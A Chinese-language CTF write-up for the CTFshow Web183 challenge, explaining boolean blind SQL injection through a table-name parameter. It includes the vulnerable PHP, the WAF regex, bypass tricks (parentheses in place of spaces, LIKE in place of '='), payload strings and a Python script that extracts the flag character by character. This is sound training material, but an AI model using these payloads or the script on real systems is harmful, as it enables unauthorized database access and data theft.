### 📌 一、题目信息

- **题目名称**：CTFshow Web183
- **漏洞类型**：布尔盲注
- **关键限制**：WAF过滤 + 无回显（只返回0或1）

---

### 🔍 二、代码分析

#### 1. SQL查询语句

```php
$sql = "select count(pass) from ".$_POST['tableName'].";";
```

- 开发者本想让你填表名（如`users`）
- 但因为直接拼接，你可以填**完整的SQL片段**
- 最终执行的SQL是：`select count(pass) from [你填的内容];`

#### 2.  WAF过滤规则

```php
function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
}
```

**被过滤的内容：**

- 🚫 所有空白字符（空格、tab、换行等）
- 🚫 特殊符号：`*` `#` `|` `=`
- 🚫 关键词：`file` `or` `select` `and` `flag` `into`

**✅ 注意：** `like`、`()`、`%` **没有被过滤**！

#### 3.  返回结果

```php
$user_count = 1;  // 或者0
```

只能看到0或1，看不到具体数据 → **布尔盲注**

---

### 💡 三、利用MySQL语法特性

##### 在MySQL中，FROM后面可以跟什么？

**正常情况：**

```sql
FROM users
FROM `users`
FROM database.users
```

**可以利用的语法：**

```sql
FROM (users) WHERE条件   -- 括号包表名，后面直接跟WHERE
FROM users WHERE条件      -- 不加括号也可以，但会有空格
```

因为WAF过滤了空格，所以用**括号包表名 + 直接连写WHERE**来绕过：

```bash
(users)where(pass)like'...'
```

### 🛡️ 四、WAF绕过技巧

| 🚫 WAF过滤 | ✅ 绕过方法             | 📝 示例         |
| :-------- | :--------------------- | :------------- |
| 空格      | 用括号包表名，直接连写 | `(users)where` |
| =         | 用like代替             | `like'admin%'` |
| select    | 不需要用（外层已有）   | -              |
| flag      | 放在引号里，WAF不检查  | `like'flag%'`  |

**最终payload格式：**

```bash
(表名)where(字段)like'要匹配的内容%'
```

示例：

```bash
(ctfshow_user)where(pass)like'ctfshow{a%'
```

---

### 🎲 五、布尔盲注原理

#### 1️⃣ 最终执行的SQL

```sql
select count(pass) from (ctfshow_user) where (pass) like 'ctfshow{a%';
```

#### 2️⃣ 数据库返回

- ✅ 如果有以`ctfshow{a`开头的pass → `count(pass)` ≥ 1 → 页面显示`$user_count = 1;`
- ❌ 如果没有 → `count(pass)` = 0 → 页面显示`$user_count = 0;`

#### 3️⃣ 判断逻辑

通过0和1来判断猜的字符对不对：

- 🔵 返回1 → 猜对了，保存这个字符
- 🔴 返回0 → 猜错了，试下一个字符

---

### 🤖 六、自动化脚本解析

```python
url = '目标网址'
# 可能用到的字符：{ - 空格 数字 小写字母
num = "{}- 0123456789abcdefghijklmnopqrstuvwxyz"
flag = "ctfshow"  # 已知前缀

for j in range(50):  # 最多猜50个字符
    for i in num:     # 遍历所有可能字符
        # 构造payload： (ctfshow_user)where(pass)like'当前flag+猜的字符%'
        data1 = {'tableName': "(ctfshow_user)where(pass)like'{}%'".format(flag + i)}
        
        # 发送请求
        result = requests.post(url, data=data1).text
        
        # 判断结果
        if "$user_count = 1;" in result:  # 猜对了！
            flag = flag + i
            print(flag)
            if i == "}":  # 猜到结尾符，结束
                exit()
            break  # 猜对就跳出内层循环，猜下一个字符

print(flag)
```

